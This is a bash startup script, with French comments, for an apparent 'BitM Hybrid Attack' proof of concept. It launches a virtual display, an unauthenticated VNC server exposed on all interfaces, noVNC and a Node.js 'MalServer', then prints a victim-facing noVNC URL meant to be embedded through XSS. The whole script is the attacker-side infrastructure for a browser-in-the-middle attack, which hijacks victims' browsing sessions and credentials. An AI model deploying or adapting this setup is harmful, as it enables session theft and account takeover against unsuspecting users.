#!/bin/bash

set -e

echo "═══════════════════════════════════════════════════"
echo "  BitM Hybrid Attack - Full Stack Startup"
echo "═══════════════════════════════════════════════════"

# Configuration
XVFB_DISPLAY=:99
XVFB_RESOLUTION="1920x1080x24"
VNC_PORT=5900
NOVNC_PORT=6080
MALSERVER_PORT=3000
BACKEND_DIR="$HOME/bitm-plus-poc/backend"
NOVNC_DIR="$HOME/bitm-plus-poc/noVNC"

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# Arrêter processus existants
log "Stopping existing processes..."
pkill -f Xvfb || true
pkill -f x11vnc || true
pkill -f fluxbox || true
pkill -f novnc || true
pkill -f websockify || true
pkill -f "node.*server.js" || true
pkill -f chrome || true
sleep 2

# Démarrer Xvfb
log "Starting Xvfb on display $XVFB_DISPLAY..."
Xvfb $XVFB_DISPLAY -screen 0 $XVFB_RESOLUTION -ac +extension GLX +render -noreset &
XVFB_PID=$!
sleep 2

if ps -p $XVFB_PID > /dev/null; then
    log "✓ Xvfb started (PID: $XVFB_PID)"
else
    error "Failed to start Xvfb"
    exit 1
fi

# Démarrer Fluxbox
log "Starting Fluxbox window manager..."
DISPLAY=$XVFB_DISPLAY fluxbox &
sleep 1

# Démarrer x11vnc
log "Starting x11vnc on port $VNC_PORT..."
x11vnc -display $XVFB_DISPLAY -bg -nopw -listen 0.0.0.0 -xkb -forever -shared -rfbport $VNC_PORT

sleep 2

if pgrep -x x11vnc > /dev/null; then
    log "✓ x11vnc started on port $VNC_PORT"
else
    error "Failed to start x11vnc"
    exit 1
fi

# Démarrer noVNC
log "Starting noVNC on port $NOVNC_PORT..."
cd "$NOVNC_DIR"
./utils/novnc_proxy --vnc localhost:$VNC_PORT --listen $NOVNC_PORT &
NOVNC_PID=$!
sleep 2

if ps -p $NOVNC_PID > /dev/null; then
    log "✓ noVNC started (PID: $NOVNC_PID)"
else
    error "Failed to start noVNC"
    exit 1
fi

# Démarrer MalServer Node.js
log "Starting MalServer on port $MALSERVER_PORT..."
cd "$BACKEND_DIR"
export DISPLAY=$XVFB_DISPLAY
npm run dev &
NODE_PID=$!
sleep 3

if ps -p $NODE_PID > /dev/null; then
    log "✓ MalServer started (PID: $NODE_PID)"
else
    error "Failed to start MalServer"
    exit 1
fi

# Résumé
LOCAL_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "═══════════════════════════════════════════════════"
echo -e "${GREEN}✓ BitM Hybrid Stack Running${NC}"
echo "═══════════════════════════════════════════════════"
echo "  Local IP:          $LOCAL_IP"
echo ""
echo "  Xvfb Display:      $XVFB_DISPLAY"
echo "  VNC Server:        vnc://$LOCAL_IP:$VNC_PORT"
echo "  noVNC Web:         http://$LOCAL_IP:$NOVNC_PORT/vnc.html"
echo "  MalServer API:     http://$LOCAL_IP:$MALSERVER_PORT"
echo ""
echo "  Process IDs:"
echo "    - Xvfb:          $XVFB_PID"
echo "    - x11vnc:        $(pgrep x11vnc)"
echo "    - noVNC:         $NOVNC_PID"
echo "    - MalServer:     $NODE_PID"
echo "═══════════════════════════════════════════════════"
echo ""
echo "Test URLs:"
echo "  MalServer Health:  http://$LOCAL_IP:$MALSERVER_PORT/health"
echo "  noVNC Direct:      http://$LOCAL_IP:$NOVNC_PORT/vnc.html"
echo ""
echo "For victim (embedded noVNC in XSS):"
echo "  http://$LOCAL_IP:$NOVNC_PORT/vnc_lite.html"
echo ""
echo "To stop all: pkill -f 'Xvfb|x11vnc|novnc|node'"
echo "═══════════════════════════════════════════════════"

# Attendre
wait $NODE_PID